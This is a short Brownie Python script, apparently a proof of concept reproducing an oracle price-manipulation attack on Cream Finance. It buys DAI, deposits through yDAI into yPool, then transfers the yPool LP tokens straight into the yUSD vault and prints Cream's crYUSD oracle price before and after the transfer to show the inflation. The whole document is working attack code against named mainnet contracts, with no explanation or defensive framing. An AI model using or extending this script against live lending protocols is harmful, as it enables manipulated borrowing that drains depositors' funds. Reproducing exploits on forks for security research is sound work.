from brownie import accounts, interface, chain

router = interface.IUniswapRouterV2('0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D')
weth = interface.IWETH('0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2')
dai = interface.ERC20('0x6B175474E89094C44Da98b954EedeAC495271d0F')
ydai = interface.IYDAI('0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01')
ypool = interface.IYPool('0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51')
ypool_lp = interface.IYPoolLp('0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8')
yusd = interface.IYUSD('0x4B5BfD52124784745c1071dcB244C6688d2533d3')
cream_price_oracle = interface.IPriceOracleProxy('0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d')
crYUSD = interface.ICrErc20('0x4BAa77013ccD6705ab0522853cB0E9d453579Dd4')

def main():
    user = accounts[0]
    print('add liquidity to get ypool lp tokens')
    router.swapETHForExactTokens(1_000_000e18, [weth, dai], user, chain.time() + 120, {'from': user, 'value': 1000e18})
    dai.approve(ydai, (1<<256)-1, {'from': user})
    ydai.deposit(dai.balanceOf(user), {'from': user})
    ydai.approve(ypool, (1<<256)-1, {'from': user})
    ypool.add_liquidity([ydai.balanceOf(user), 0, 0, 0], 0, {'from': user})
    old_price_yusd = cream_price_oracle.getUnderlyingPrice(crYUSD)
    print(f'[Before] price of yusd in cream.finance is {old_price_yusd}')
    print('transfer this lp tokens directly to yusd')
    ypool_lp.transfer(yusd, ypool_lp.balanceOf(user), {'from': user})
    new_price_yusd = cream_price_oracle.getUnderlyingPrice(crYUSD)
    print(f'[After] price of yusd in cream.finance is {new_price_yusd}')
